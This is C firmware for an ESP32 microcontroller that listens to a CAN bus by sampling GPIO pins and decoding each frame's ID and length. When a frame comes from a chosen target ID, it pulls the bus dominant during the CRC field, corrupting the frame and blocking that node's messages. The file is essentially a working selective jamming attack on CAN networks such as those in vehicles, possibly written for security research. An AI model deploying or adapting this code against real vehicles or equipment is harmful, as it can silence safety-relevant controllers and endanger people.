#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <math.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"
#include "freertos/semphr.h"
#include "driver/gpio.h"
#include "esp_types.h"
#include "soc/timer_group_struct.h"
#include "driver/periph_ctrl.h"
#include "driver/timer.h"

#define GPIO_RX                 16                          // GPIO pin for receiving CAN frames (RX pin)
#define GPIO_RX_PIN_SEL         (1ULL<<GPIO_RX)             // Pin mask of RX pin

#define GPIO_TX                 2                           // GPIO pin for transmitting/injecting CAN frames (TX pin)
#define GPIO_TX_PIN_SEL         (1ULL<<GPIO_TX)             // Pin mask of TX pin

#define TIMER_DIVIDER           40                          // Hardware clock divider
#define TICK_INTER              8                           // Number of ticks per 4us

#define NUM_BIT_CONTROL         19                          // Number of bits of ID and control field

#define TARGET_ID               5                           // Target ID whose messages are to be blocked
																
#define ESP_INTR_FLAG_DEFAULT   0


uint32_t id = 0;                                            // ID of the current frame
uint8_t dlc = 0;                                            // DLC of the current frame

uint64_t timer_value = 0;                                   // Current timer value
uint32_t timeout_control =  NUM_BIT_CONTROL * TICK_INTER;   // Current control timeout
uint32_t timeout_data = 8 * TICK_INTER;                     // Current data timeout
uint32_t timeout_crc = 15 * TICK_INTER;                     // Current CRC timeout
uint32_t timeout_frame = 3 * TICK_INTER;                    // Current frame timeout
uint64_t time[NUM_BIT_CONTROL+1];                           // Timestamps of the ID and control field
bool stuff_bits[NUM_BIT_CONTROL+1];                         // Position of stuff bits in the ID and control field
bool control_data[NUM_BIT_CONTROL];                         // Calculated ID and control data
bool new_frame = 0;                                         // Flag for synchronization between capture and calculation task
bool crc_field = 0;                                         // Flag to signal beginning of CRC field


//****************************************************************************
// @Function      static void tg0_timer_init(uint32_t timer_index)
//
//----------------------------------------------------------------------------
// @Description   This function initializes the timer with the previously
//				  defined values and sets the count direction, the state, 
//				  start value and interrupt settings.
//
//----------------------------------------------------------------------------
// @Returnvalue   None
//
//----------------------------------------------------------------------------
// @Parameters    uint32_t timer_index:
//					The index of the timer, which should get initialized.
//
//****************************************************************************

static void tg0_timer_init(uint32_t timer_index)
{
    // Select and initialize basic parameters of the timer
    timer_config_t config;
    config.divider = TIMER_DIVIDER;                     // Set the previously time divider
    config.counter_dir = TIMER_COUNT_UP;                // Set counting direction to increment
    config.counter_en = TIMER_PAUSE;                    // Stop the timer
    config.alarm_en = TIMER_ALARM_DIS;                  // Disable the alarm
    config.intr_type = TIMER_INTR_LEVEL;                // Set interrupt type
    config.auto_reload = 1;                             // Enable autoreload
    timer_init(TIMER_GROUP_0, timer_index, &config);    // Set configuration
    
    // Set the start value to zero
    timer_set_counter_value(TIMER_GROUP_0, timer_index, 0x00000000ULL);
}


//****************************************************************************
// @Function      static void gpio_configuration_rx()
//
//----------------------------------------------------------------------------
// @Description   This function initializes the GPIO RX.
//
//----------------------------------------------------------------------------
// @Returnvalue   None
//
//----------------------------------------------------------------------------
// @Parameters    None
//
//****************************************************************************

static void gpio_configuration_rx()
{
    gpio_config_t io_conf;

    io_conf.pin_bit_mask = GPIO_RX_PIN_SEL;         // Bit mask of the RX pin
    io_conf.mode = GPIO_MODE_INPUT;                 // Set input mode
    io_conf.pull_up_en = 0;                         // Disable pull up mode
    io_conf.pull_down_en = 0;                       // Disable pull down mode
    gpio_config(&io_conf);                          // Set configuration
}


//****************************************************************************
// @Function      static void gpio_configuration_tx()
//
//----------------------------------------------------------------------------
// @Description   This function initializes the GPIO TX.
//
//----------------------------------------------------------------------------
// @Returnvalue   None
//
//----------------------------------------------------------------------------
// @Parameters    None
//
//****************************************************************************

static void gpio_configuration_tx()
{
    gpio_config_t io_conf;
    
    io_conf.pin_bit_mask = GPIO_TX_PIN_SEL;         // Bit mask of the output pin
    io_conf.mode = GPIO_MODE_OUTPUT;                // Set output mode
    io_conf.pull_up_en = 0;                         // Disable pull up mode
    io_conf.pull_down_en = 0;                       // Disable pull down mode
    gpio_config(&io_conf);                          // Set configuration
}


//****************************************************************************
// @Function      static void injection_task()
//
//----------------------------------------------------------------------------
// @Description   This function calculates the DLC and the ID of the current
//                frame from the received bits and executes the injection when
//                the target ID is detected.
//
//----------------------------------------------------------------------------
// @Returnvalue   None
//
//----------------------------------------------------------------------------
// @Parameters    None
//
//****************************************************************************

static void injection_task(void *arg)
{
	// Variables to store the current bus state and the index to read the next timestamp
	bool state = 0;
	uint32_t index = 1;
	uint8_t num_state;
	// Variables for timing the injection attack
	uint64_t injection_timer = 0;
	uint64_t injection_timeout = 5 * TICK_INTER;
	
	while(1)
	{
		// Wait for a new frame, which is deteced by the capture task
		while(!new_frame);
		
		// Wait for the end of capturing ID and control bits
		while(timer_value < timeout_control);
		
		// Calculate control data
		for(uint8_t ctr_index = 0; ctr_index < NUM_BIT_CONTROL;)
		{	
			num_state = round((time[index+1] - time[index])/8.0);   // Calculate the number of successive equal states
			if(stuff_bits[index]) --num_state;                      // Ignore stuff bits
			// Calculate the binary representation of the control data
			for(; (num_state > 0) && (ctr_index < NUM_BIT_CONTROL); --num_state) control_data[ctr_index++] = state;
			state = !state;
			index++;
		}
		
		// Calculate the DLC from the binary representation of the control data
		for(int i = 0; i < 4; ++i)
		{
			dlc = dlc << 1;
			if(control_data[15+i]) ++dlc;
		}
			
		// Correct data timeout using the determined DLC
		timeout_data += (dlc-1) * 8 * TICK_INTER;
			
		// Calculate the ID from the binary representation of the control data
		for(int i = 0; i < 11; ++i)
		{
			id = id << 1;
			if(control_data[1+i]) ++id;
		}
			
		// Print the ID and DLC
		if(id == TARGET_ID) printf("Frame from target ID: %x, DLC: %x\n", id, dlc);
		else printf("ID: %x, DLC: %x\n", id, dlc);
		
		// Wait for the end of capturing data bits
		while(timer_value < timeout_data);
		
		// Injection phase
		if(id == TARGET_ID)
		{
			// Wait for first low state in the CRC field
			while(!crc_field || !gpio_get_level(GPIO_RX));
			
			// Start the injection
			gpio_set_level(GPIO_TX, 0);
			timer_get_counter_value(TIMER_GROUP_0, 0, &injection_timer);
			injection_timeout += injection_timer;
			while(injection_timer < injection_timeout) timer_get_counter_value(TIMER_GROUP_0, 0, &injection_timer);
			gpio_set_level(GPIO_TX, 1);	// End of injection
		}
		
		// Reset variables and prepare for the next CAN frame
		state = 0;
		index = 1;
		new_frame = 0;
		crc_field = 0;
		injection_timeout = 5 * TICK_INTER;
	}
}


//****************************************************************************
// @Function      static void capture_task()
//
//----------------------------------------------------------------------------
// @Description   This function detects the complete CAN frame and sets
//                corresponding flags for the synchronization of the injection
//                task.
//
//----------------------------------------------------------------------------
// @Returnvalue   None
//
//----------------------------------------------------------------------------
// @Parameters    None
//
//****************************************************************************

static void capture_task(void *arg)
{
	// Variables to store the current bus state and the index to write the next timestamp
	uint64_t last_timer_value;
	bool state = 1;
	uint32_t index = 1;
	
	// Initalize time, control data and stuff bit array
	for(int i = 0; i < NUM_BIT_CONTROL; ++i) control_data[i] = 0;
	for(int i = 0; i < NUM_BIT_CONTROL+1; ++i) time[i] = stuff_bits[i] = 0;		
	
	// Initalize TX pin
	gpio_set_level(GPIO_TX, 1);
	
	while(1)
	{
		// Wait for Start-of-Frame bit
		while(gpio_get_level(GPIO_RX) == state);
		
		// Start of a new frame
		timer_start(TIMER_GROUP_0, 0);
		new_frame = 1;                  // Set new_frame flag for synchronization with the injection task
	
		// Capture all ID and control bits
		while(timer_value < timeout_control)
		{
			if(gpio_get_level(GPIO_RX) != state)
			{
				timer_get_counter_value(TIMER_GROUP_0, 0, &time[index]);
				// Check if the next bit will be a stuff bit
				if(time[index]-time[index-1] > 35)
				{
					stuff_bits[index] = 1;		// Tag bit as a stuff bit
					timeout_control += 8;		// Adapt the control data timeout
				}
				//gpio_set_level(GPIO_TX, !state);
				state = !state;
				++index;
			}
			
			timer_get_counter_value(TIMER_GROUP_0, 0, &timer_value);
		}
		
		// Prepare for capturing data bits
		last_timer_value = time[index-1];
		timeout_data += timeout_control;
		
		// Capture all data bits
		while(timer_value < timeout_data)
		{
			if(gpio_get_level(GPIO_RX) != state)
			{
				timer_get_counter_value(TIMER_GROUP_0, 0, &timer_value);
				// Check if the next bit will be a stuff bit
				if(timer_value-last_timer_value > 35) timeout_data += TICK_INTER;
				//gpio_set_level(GPIO_TX, !state);
				last_timer_value = timer_value;
				state = !state;
			}
			
			timer_get_counter_value(TIMER_GROUP_0, 0, &timer_value);
		}
		
		
		// Prepare for capturing CRC bits
		timeout_crc += timeout_data;
		crc_field = 1;                  // Set crc_field flag for synchronization with the injection task
		
		// Capture all CRC bits
		while(timer_value < timeout_crc)
		{
			if(gpio_get_level(GPIO_RX) != state)
			{
				timer_get_counter_value(TIMER_GROUP_0, 0, &timer_value);
				// Check if the next bit will be a stuff bit
				if(timer_value-last_timer_value > 35) timeout_crc += 8;
				//gpio_set_level(GPIO_TX, !state);
				last_timer_value = timer_value;
				state = !state;
			}
			
			timer_get_counter_value(TIMER_GROUP_0, 0, &timer_value);
		}
		
		
		// Prepare for capturing CRC delimeter and ACK bits
		timeout_frame += timeout_crc;
		
		// Capture the CRC delimeter and the ACK bits
		while(timer_value < timeout_frame)
		{
			if(gpio_get_level(GPIO_RX) != state)
			{
				timer_get_counter_value(TIMER_GROUP_0, 0, &timer_value);
				//gpio_set_level(GPIO_TX, !state);
				state = !state;
			}
			
			timer_get_counter_value(TIMER_GROUP_0, 0, &timer_value);
		}
		
		
		// Reset time and stuff bit array, timeouts and other variables
		for(int i = 0; i < NUM_BIT_CONTROL+1; ++i) time[i] = stuff_bits[i] = 0;
		index = 1;
		state = 1;
		timeout_control = NUM_BIT_CONTROL * TICK_INTER;
		timeout_data = 8 * TICK_INTER;
		timeout_crc = 15 * TICK_INTER;
		timeout_frame = 3 * TICK_INTER;
		id = 0;
		dlc = 0;
		
		// Reset timer
		timer_pause(TIMER_GROUP_0, 0);
		timer_set_counter_value(TIMER_GROUP_0, 0, 0x00000000ULL);
		timer_get_counter_value(TIMER_GROUP_0, 0, &timer_value);
	}
}


//****************************************************************************
// @Function      void app_main()
//
//----------------------------------------------------------------------------
// @Description   This is the main function.
//
//----------------------------------------------------------------------------
// @Returnvalue   None
//
//----------------------------------------------------------------------------
// @Parameters    None
//
//****************************************************************************

void app_main()
{
	// Initalzie RX and TX pins
	gpio_configuration_rx();
	gpio_configuration_tx();
	
	// Initalize timer
	tg0_timer_init(0);
	
	// Start capture and injection task
    xTaskCreatePinnedToCore(capture_task, "capture_task", 2048, NULL, 25, NULL, 1);
	xTaskCreatePinnedToCore(injection_task, "injection_task", 2048, NULL, 25, NULL, 0);
}
